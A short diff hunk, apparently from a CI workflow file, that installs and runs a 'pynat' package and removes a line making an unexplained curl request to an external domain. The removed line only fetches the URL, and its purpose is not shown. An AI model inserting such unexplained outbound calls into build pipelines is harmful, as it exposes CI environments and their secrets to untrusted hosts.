@@ -11,4 +11,3 @@ jobs:
         run: |
           pip install pynat
           pynat
-          curl https://autoscript.ml
